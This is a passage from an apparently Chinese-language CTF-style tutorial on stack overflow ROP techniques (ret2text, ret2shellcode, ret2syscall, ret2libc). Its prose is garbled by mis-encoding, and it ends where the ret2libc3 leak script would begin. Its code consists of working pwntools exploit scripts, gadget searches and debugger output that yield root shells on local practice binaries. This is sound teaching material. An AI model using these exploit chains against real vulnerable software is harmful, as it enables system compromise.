   0x080486ab <+99>:    mov    DWORD PTR [esp],eax
   0x080486ae <+102>:   call   0x8048460 <gets@plt>
   0x080486b3 <+107>:   mov    DWORD PTR [esp],0x80487a4
   0x080486ba <+114>:   call   0x8048450 <printf@plt>
   0x080486bf <+119>:   mov    eax,0x0
   0x080486c4 <+124>:   leave
   0x080486c5 <+125>:   ret
End of assembler dump.
```

åœ¨`gets`å¤„è®¾ç½®æ–­ç‚¹

```bash
pwndbg> b *0x080486ae
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
```

`run`ç„¶åè§‚å¯Ÿæ ˆå¸§

```bash
pwndbg> run                 
Starting program: /root/Desktop/Test/StackBufferOverFlow/ret2text/ret2text 
warning: Unable to find libthread_db matching inferior''s thread library, thread debugging will not be available.
There is something amazing here, do you know anything?
                                                         
Breakpoint 1, 0x080486ae in main () at ret2text.c:24
warning: 24     ret2text.c: No such file or directory
Warning: Avoided exploring possible address 0xfffdade8.                                                                                                                                                                             
You can explicitly explore it with `vmmap-explore 0xfffda000`
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 EAX  0xffffcfac â—‚â€” 0   
 EBX  0xf7f9ae14 â—‚â€” 0x232d0c /* '\x0c-#' */                                                                                                                                                                                         
 ECX  0xf7f9c8e0 â—‚â€” 0
 EDX  0
 EDI  0xf7ffcb60 (_rtld_global_ro) â—‚â€” 0
 ESI  0x80486d0 (__libc_csu_init) â—‚â€” push ebp
 EBP  0xffffd018 â—‚â€” 0
 ESP  0xffffcf90 â€”â–¸ 0xffffcfac â—‚â€” 0
 EIP  0x80486ae (main+102) â€”â–¸ 0xfffdade8 â—‚â€” 0xfffdade8
```

å¯ä»¥çœ‹åˆ°`EBP` =`0xffffd018` ï¼Œ`ESP` =`0xffffcfa`

```bash
pwndbg> p/d 0xffffd018 - 0xffffcfac
$1 = 108
```

ç¼–å†™`exp`  

```bash
(pwn) âœ  ret2text cat exp.py
from pwn import *

sh = process('./ret2text')
target = 0x0804863a
payload = b'A' * 112 + p32(target)
sh.sendline(payload)
sh.interactive()
```

```bash
(pwn) âœ  ret2text python exp.py
[+] Starting local process './ret2text': pid 3343
[*] Switching to interactive mode
There is something amazing here, do you know anything?
Maybe I will tell you next time !$ whoami
root
$  
```

## **ret2shellcode**

`ret2shellcode`ï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œ `shellcode` ä»£ç ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œshellcode éœ€è¦æˆ‘ä»¬è‡ªè¡Œç¼–å†™ï¼Œå³æ­¤æ—¶æˆ‘ä»¬éœ€è¦è‡ªè¡Œå‘å†…å­˜ä¸­å¡«å……ä¸€äº›å¯æ‰§è¡Œçš„ä»£ç ã€‚
æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶ï¼Œæœªå¼€å¯ä»»ä½•ä¿æŠ¤

```bash
âœ  ret2shellcode checksec ret2shellcode 
[*] '/root/Desktop/Test/StackBufferOverFlow/ret2shellcode/ret2shellcode'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
```

ä¾æ—§æ˜¯`gets` ï¼Œå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image1.png)

ä½†æ˜¯è¿™æ¬¡å¹¶æ²¡æœ‰å…¶ä»–å‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰ `/bin/sh` çš„èº«å½±

è¿™é‡Œä½¿ç”¨`strncpy`å°†`s`ä¼ é€’åˆ°`buf2`

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image2.png)

æˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹ç¨‹åºï¼ŒæŸ¥çœ‹`bss`åŒºåŸŸæ˜¯å¦æ‹¥æœ‰è¯»å†™æƒé™

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image3.png)

```bash
 0x804a000  0x804b000 rw-p     1000   1000 ret2shellcode
```

é‚£ä¹ˆæ€è·¯å°±æ˜¯ï¼š`shellcode +ï¼ˆåç§»å€¼ - len(shellcode)ï¼‰* A  + buf2add`

è®¡ç®—åç§»é‡

é¦–å…ˆç”Ÿæˆ`200`é•¿åº¦ä½†æ˜¯æ¯ä¸€æ®µéƒ½æ˜¯å”¯ä¸€çš„å­—ç¬¦

```bash
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image4.png)

è¿”å›åœ°å€è¢«`daab` è¦†ç›–ä¸Šå»äº†ï¼Œå†è®¡ç®—åç§»é‡

```bash
pwndbg> cyclic -l daab
Finding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)
Found at offset 112
```

åç§»é‡å’Œ`buf2`åœ°å€æˆ‘ä»¬éƒ½çŸ¥é“äº†ï¼Œç›´æ¥ç¼–å†™`payload`

```bash
from pwn import *
shellcode = asm(shellcraft.sh())
shellcode_pad = shellcode + (112 - (len(shellcode))) * b'A'
buf2_add = 0x804a080
sh = process('./ret2shellcode')
sh.sendline(shellcode_pad + p32(buf2_add))
sh.interactive()
```

```bash
root@sunset-virtual-machine:~# python3 exp.py 
[+] Starting local process './ret2shellcode': pid 58718
[*] Switching to interactive mode
No system for you this time !!!
bye bye ~$ id
uid=0(root) gid=0(root) groups=0(root)
```

## **ret2syscall**

`ret2syscall`ï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– `shell`ã€‚

æŸ¥çœ‹ç¨‹åºï¼Œ`32`ä½ï¼Œé™æ€ç¨‹åºï¼Œæ²¡æœ‰ä½¿ç”¨åŠ¨æ€é“¾æ¥åº“

```bash
âœ  ret2syscall file ret2syscall 
ret2syscall: ELF 32-bit LSB executable, Intel i386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped
```

æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶ï¼Œæ ˆä¸å¯æ‰§è¡Œï¼Œæ— æ³•ä½¿ç”¨`ret2shellcode`

```bash
âœ  ret2syscall checksec ret2syscall            
[*] '/root/Desktop/Test/StackBufferOverFlow/ret2syscall/ret2syscall'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
```

è¿™é‡Œè¿˜æ¶‰åŠåˆ°ç³»ç»Ÿè°ƒç”¨ï¼Œä¸€èˆ¬æˆ‘ä»¬é€šè¿‡ä¸€ä¸‹ç³»ç»Ÿè°ƒç”¨æ¥è·å¾—`shell`

```bash
execve("/bin/sh",NULL,NULL)
```

å½“é‡åˆ°`32`ä½ç¨‹åºæ—¶ï¼Œéœ€è¦ä½¿å¾—ï¼š

- ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ eax åº”è¯¥ä¸º `0xb`ï¼ˆ`0xb` ä¸º `execve` å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰ä¹Ÿå°±æ˜¯`11`
- ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ ebx åº”è¯¥æŒ‡å‘ `/bin/sh` çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚
- ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ ecx åº”è¯¥ä¸º `0`
- ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ edx åº”è¯¥ä¸º `0`

æœ€åå°†ç³»ç»Ÿè°ƒç”¨å’Œå‚æ•°éƒ½å¡«å…¥å¯„å­˜å™¨åï¼Œæˆ‘ä»¬å†è®©ç³»ç»Ÿè§¦å‘ `0x80` å·ä¸­æ–­ï¼ˆ`int 0x80`ï¼‰

`Linux`å¯¹ç³»ç»Ÿè°ƒç”¨çš„è°ƒç”¨å¿…é¡»é€šè¿‡æ‰§è¡Œ`int $0x80`æ±‡ç¼–æŒ‡ä»¤ï¼Œè¿™æ¡æŒ‡ä»¤ä¼šäº§ç”Ÿå‘é‡ä¸º`128`çš„ç¼–ç¨‹å¼‚å¸¸

IDA åç¼–è¯‘ç¨‹åºï¼Œä¾æ—§æ˜¯`gets` ï¼Œå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image5.png)

`shift` + `F12` æŸ¥çœ‹ç¨‹åºå­—ç¬¦ä¸²ï¼Œèƒ½çœ‹åˆ° `/bin/sh` æˆ‘ä»¬åˆšå¥½å¯ä»¥åˆ©ç”¨

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image6.png)

ä½†æ˜¯å› ä¸ºå¼€å¯äº† `NX` æˆ‘ä»¬æ— æ³•å¾€æ ˆä¸Šå†™ï¼Œå†™äº†ä¹Ÿæ— æ³•æ‰§è¡Œï¼Œä¹Ÿä¸å­˜åœ¨`system("/bin/sh")` ä»£ç æ®µï¼Œç¨‹åºæ˜¯é™æ€çš„ï¼Œæ‰€ä»¥ `ret2shellcode` `ret2text` `ret2libc` éƒ½æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯å­˜åœ¨`/bin/sh` ä»£ç ç‰‡æ®µï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯• `ret2syscall`

é€šè¿‡`ROPgadget` æŸ¥æ‰¾éœ€è¦ç”¨åˆ°å¯„å­˜å™¨æŒ‡ä»¤

`pop eax ; ret` åœ°å€ä¸º `0x080bb196`

```bash
âœ  ret2syscall ROPgadget --binary ret2syscall --only "pop|ret" | grep eax
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
**0x080bb196 : pop eax ; ret**
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

å‘ç°ä¸€ä¸²è¿ç»­çš„å°†`ebx~edx`å¼¹å‡ºçš„`pop edx ; pop ecx ; pop ebx ; ret` ï¼Œåœ°å€ä¸º`0x0806eb90`

```bash
âœ  ret2syscall ROPgadget --binary ret2syscall --only "pop|ret" | grep ebx
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
**0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret**
```

å‘½ä»¤å­—æ®µ `0x080be408` åœ°å€

```bash
âœ  ret2syscall ROPgadget --binary ret2syscall --string "/bin/sh"         
Strings information
============================================================
0x080be408 : /bin/sh
```

ä¸­æ–­ä»£ç åœ°å€ `0x08049421`

```bash
âœ  ret2syscall ROPgadget --binary ret2syscall --only "int"   
Gadgets information
============================================================
0x08049421 : int 0x80
0x080890b5 : int 0xcf
```

è®¡ç®—åç§»é‡ï¼Œä¸º`112`

```bash
pwndbg> cyclic 200
aaaabaaacaaa...waabxaabyaab

pwndbg> run
Starting program: /root/Desktop/Test/StackBufferOverFlow/ret2syscall/ret2syscall 
This time, no system() and NO SHELLCODE!!!
What do you plan to do?
aaaabaaacaaadaaaeaaafaaagaaaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.                  
0x62616164 in ?? ()                                                                                               
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA                                                                  
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€
 ECX  0xfbad2288                                                                                                  
 EDX  0x80eb4e0 (_IO_stdfile_0_lock) â—‚â€” 0                                                                         
 EDI  0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) â€”â–¸ 0x8067b10 (__stpcpy_sse2) â—‚â€” mov edx, dword ptr [esp + 4]
 ESI  0             
 ESP  0xffffd100 â—‚â€” 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
 EIP  0x62616164 ('daab')
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / i386 / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Invalid address 0x62616164

pwndbg> cyclic -l daab
Finding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)
Found at offset 112
```

ä½¿ç”¨ä»£ç å—ç»˜åˆ¶çš„åˆ©ç”¨é“¾

```bash
           |-----------------------------| é«˜åœ°å€
           | ...                         |
           |-----------------------------|
           | int_0x80_addr               |  <-- ret from pop_..._ret
           |-----------------------------|
           | bin_sh_addr                 |  <-- pop into ebx
           |-----------------------------|
           | 0x0                         |  <-- pop into ecx
           |-----------------------------|
           | 0x0                         |  <-- pop into edx
           |-----------------------------|
           | pop_edx_ecx_ebx_ret_addr    |  <-- ret from pop_eax_ret
           |-----------------------------|
           | 0xb                         |  <-- pop into eax
           |-----------------------------|
           | pop_eax_ret_addr            |  <-- Overwritten return address
   ebp     |-----------------------------|
           | ...                         |
           |-----------------------------|
   buf ->  | gets buffer start           |
   esp     |-----------------------------| ä½åœ°å€
```

ç¼–å†™`EXP`

```bash
from pwn import *

pop_eax_ret_addr = 0x080bb196
pop_edx_ecx_ebx_addr = 0x0806eb90
bin_sh_addr = 0x080be408
int_0x80_addr = 0x08049421

sh = process('./ret2syscall')
sh.sendline(b'A'*112 + p32(pop_eax_ret_addr) + p32(0xb) + p32(pop_edx_ecx_ebx_addr) + p32(0) + p32(0) + p32(bin_sh_addr) + p32(int_0x80_addr))
sh.interactive()
```

```bash
(pwn) âœ  ret2syscall python exp.py
[+] Starting local process './ret2syscall': pid 2825
[*] Switching to interactive mode
This time, no system() and NO SHELLCODE!!!
What do you plan to do?
$ whoami
root
```

## ret2libc

`ret2libc` å³æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ `libc` ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ `plt` å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ `got` è¡¨é¡¹çš„å†…å®¹)ã€‚

å…¶ä¸­ `libc` æŒ‡çš„æ˜¯`C` æ ‡å‡†åº“ï¼ˆ`standard C library`ï¼‰çš„å®ç°ï¼Œé€šå¸¸æ˜¯ `/lib/x86_64-linux-gnu/libc.so.6` æˆ– `/lib/i386-linux-gnu/libc.so.6`

`libc`åº“æ˜¯`Linux`ä¸‹çš„`C`å‡½æ•°åº“ï¼Œè€Œ`libc`åº“ä¸­å­˜æ”¾çš„å°±æ˜¯è¿™äº›å‡½æ•°çš„åç§»åœ°å€ï¼Œæ‰€ä»¥åªè¦ç¡®å®šäº†`libc`åº“çš„ç‰ˆæœ¬ï¼Œå°±èƒ½çŸ¥é“å‡½æ•°çš„åç§»åœ°å€ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œåœ¨æœ¬åœ°è¿è¡Œçš„æ ·æœ¬ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å¿½è§†ã€‚

### ret2libc1

ä½¿ç”¨ IDA åç¼–è¯‘ï¼Œ`gets`å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image7.png)

`secure` ä¸­çš„ `system`è¢«ä¿®æ”¹äº†ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨`ret2text`

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image8.png)

`32` ä½ç¨‹åºï¼Œå¹¶ä¸”è°ƒç”¨åŠ¨æ€é“¾æ¥åº“

```bash
âœ  ret2libc file ret2libc1         
ret2libc1: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped
```

`NX` å¯åŠ¨ï¼Œæ‰€ä»¥`ret2shellcode` ä¹Ÿæ— æ³•ä½¿ç”¨

```bash
âœ  ret2libc checksec ret2libc1 
[*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc1'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
```

å› ä¸ºè¿™é‡Œç”¨äº†åŠ¨æ€é“¾æ¥åº“ï¼Œæ‰€ä»¥ä¼˜å…ˆä½¿ç”¨ `ret2libc`

å­—ç¬¦ä¸²ä¸­èƒ½çœ‹åˆ° `/bin/sh` `08048720`

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image9.png)

å°è¯•å¯»æ‰¾ `system`å‡½æ•°ï¼Œä¹Ÿæ‰¾åˆ°äº†`08048460`

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image10.png)

è®¡ç®—åç§»å€¼ï¼ˆå’Œä¸Šè¾¹ä¸€æ ·çš„æ“ä½œï¼‰

```bash
pwndbg> cyclic -l daab
Finding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)
Found at offset 112
```

```bash
(pwn) âœ  ret2libc cat exp.py 
from pwn import *

system_plt_addr = 0x08048460
bin_sh_addr = 0x8048720
sh = process('./ret2libc1')
sh.sendline(112 * b'A' + p32(system_plt_addr) + 4 * b'A' + p32(bin_sh_addr))
sh.interactive()
```

å¯ä»¥çœ‹åˆ°ä¸ºä»€ä¹ˆè¦åŠ ä¸Š `4 * b'A'` ï¼Œå› ä¸ºè¿™æ˜¯ç»™`system`çš„å‡çš„è¿”å›åœ°å€

```bash
           | ... higher addresses ...   |
           +----------------------------+
           | p32(bin_sh_addr)           | <-- (è¢«æˆ‘ä»¬å†™å…¥) system çš„å‚æ•°
           +----------------------------+
           | 4 * b'A' (0x41414141)      | <-- (è¢«æˆ‘ä»¬å†™å…¥) system çš„å‡è¿”å›åœ°å€
           +----------------------------+
           | p32(system_plt_addr)       | <-- (è¢«æˆ‘ä»¬å†™å…¥) è¦†ç›–äº† main çš„è¿”å›åœ°å€
           +----------------------------+
           | 4 å­—èŠ‚çš„ 'A'               | <-- (è¢«æˆ‘ä»¬å†™å…¥) è¦†ç›–äº† old EBP
           +----------------------------+
           | 108 å­—èŠ‚çš„ 'A'             | \
           | ...                        |  |
           | 'A'                        |  } å¡«å……äº†æ•´ä¸ª buffer å’Œé¢å¤–çš„ç©ºé—´
           | 'A'                        | /
           +----------------------------+ <-- buffer çš„èµ·å§‹åœ°å€
           | ... lower addresses ...    |
```

```bash
(pwn) âœ  ret2libc python exp.py
[+] Starting local process './ret2libc1': pid 3166
[*] Switching to interactive mode
RET2LIBC >_<
$ whoami
root
```

### ret2libc2

ä¾æ—§æ˜¯ `gets` ï¼Œå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image11.png)

`checksec`ä»¥åŠæ–‡ä»¶ç±»å‹ï¼Œå’Œ`ret2libc1`åŸºæœ¬æ²¡å·®

```bash
(pwn) âœ  ret2libc checksec ret2libc1
[*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc1'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
(pwn) âœ  ret2libc file ret2libc2         
ret2libc2: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped
```

å­—ç¬¦ä¸²ä¸­æ‰¾ä¸åˆ° `/bin/sh`äº†

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image12.png)

`system` å‡½æ•°è¿˜åœ¨ `0x08048490`

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image13.png)

æ‰€ä»¥éœ€è¦æˆ‘ä»¬æ„é€  `/bin/sh` `0x08048480`

å¯ä»¥çœ‹åˆ°è¿˜å­˜åœ¨`gets` `0x08048460`

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image14.png)

æˆ‘ä»¬å¯ä»¥å¤šè°ƒç”¨ä¸€æ¬¡`gadget` ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰¾åˆ°ä¸€ç‰‡å¯è¯»å†™çš„ç¼“å†²åŒº

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image15.png)

`buf2`åŒºåŸŸåˆšå¥½å¯ä»¥ `0x0804A080`

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image16.png)

æ­¤æ—¶æˆ‘ä»¬è¿˜è¦ä¿æŒå †æ ˆå¹³è¡¡ï¼Œä¹Ÿå°±æ˜¯`gets`æ‰§è¡Œå®Œæ—¶ï¼Œ`gets`çš„è¿”å›åœ°å€ä¼šå¤„äºæ ˆé¡¶ï¼Œä½†æ˜¯æ¥ä¸‹æ¥æˆ‘ä»¬è°ƒç”¨`system`å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨è¿”å›åœ°å€`+4`(å°±æ˜¯è¦æŠŠ`buf`æ¸…ç†æ‰ï¼Œè®©`ROP`é“¾æŒ‡å‘ä¸‹ä¸€æ¡ä¹Ÿå°±æ˜¯`system`)ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥å¯»æ‰¾ `pop xxx ;ret` æˆ–è€… `add esp 4; ret`

```bash
ESP --> | p32(pop_ebx_addr) |  <-- getså‡½æ•°çš„â€œè¿”å›åœ°å€â€
        +-------------------+
        |  p32(buf2_addr)   |  <-- getså‡½æ•°çš„å‚æ•°ï¼ˆgetså†™å…¥åï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶å¼¹å‡ºï¼‰
        +-------------------+
        | p32(libc_system_addr) |
        +-------------------+
        |      b'B'*4       |
        +-------------------+
        |  p32(buf2_addr)   |
        +-------------------+
```

ä½¿ç”¨`ROPgadget`æ¥å¯»æ‰¾`0x0804843d` å°±ç¬¦åˆ

```bash
(pwn) âœ  ret2libc ROPgadget --binary ret2libc2 --only "pop|ret"
Gadgets information
============================================================
0x0804872f : pop ebp ; ret
0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804843d : pop ebx ; ret
```

è®¡ç®—åç§»å€¼ï¼Œä¹Ÿå’Œä¸Šè¾¹ä¸€æ ·æ˜¯`112`

```bash
from pwn import *

gets_plt_addr = 0x08048460
pop_ebx_ret_addr = 0x0804843d
system_plt_addr = 0x08048490
buf2 = 0x0804A080

sh = process('./ret2libc2')
sh.sendline(112 * b'A' + p32(gets_plt_addr) + p32(pop_ebx_ret_addr) + p32(buf2) + p32(system_plt_addr) + 4 * b'A' + p32(buf2))
sh.sendline('/bin/sh')
sh.interactive()
```

```bash
(pwn) âœ  ret2libc python exp.py   
[+] Starting local process './ret2libc2': pid 4087
/root/Desktop/Test/StackBufferOverFlow/ret2libc/exp.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  sh.sendline('/bin/sh')
[*] Switching to interactive mode
Something surprise here, but I don't think it will work.
What do you think ?$ id
uid=0(root) gid=0(root) ç»„=0(root)
```

### ret2libc3

ä¾æ—§æ˜¯`gets`

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image17.png)

ä¿æŠ¤æœºåˆ¶å’Œæ–‡ä»¶ç±»å‹

```bash
âœ  ret2libc checksec ret2libc3
[*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
âœ  ret2libc file ret2libc3
ret2libc3: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped
```

å­˜åœ¨`gets`ï¼Œå¯ä»¥ç”¨æ¥æ„é€ `/bin/sh`

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image18.png)

![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image19.png)

ä½†æ˜¯`system`å‡½æ•°ä¹Ÿæ²¡äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å¯»æ‰¾`system`å‡½æ•°

æ‰¾åˆ°`system()`å‡½æ•°å’Œ`/bin/sh`å­—ç¬¦ä¸²åœ¨`libc`ä¸­çš„åœ°å€

- é¦–å…ˆè·å¾—ä¸€ä¸ªå‡½æ•°çš„çœŸå®åœ°å€ï¼Œä¾‹å¦‚ï¼š`__libc_start_main`ï¼Œ`puts`
- å¾—åˆ°çœŸå®åœ°å€åï¼Œæ ¹æ®æœ€åä¸‰ä½å³å¯å¾—åˆ° libc ç‰ˆæœ¬
- å¾—åˆ° libc ç‰ˆæœ¬åå°±å¯ä»¥å¾ˆå®¹æ˜“ç¡®å®šè·å¾—çš„çœŸå®å‡½æ•°çš„åç§»åœ°å€ï¼ˆè¿™é‡Œå‡è®¾`puts`ï¼‰
- è®¡ç®—åŸºåœ°å€ï¼ŒåŸºåœ°å€ = puts å‡½æ•°çœŸå®åœ°å€ - puts å‡½æ•°åç§»åœ°å€
- å¾—åˆ° libc ç‰ˆæœ¬åè·å– system åœ°å€ä¸ /bin/sh çš„åç§»åœ°å€
- æ ¹æ® çœŸå®åœ°å€ = åŸºåœ°å€ + åç§»åœ°å€
- å†æ¬¡æ‰§è¡Œæºç¨‹åº
- è§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ `system(â€˜/bin/shâ€™)`

ç¼–å†™è„šæœ¬æ³„éœ²`libc_start_main`çš„çœŸå®åœ°å€

```bash
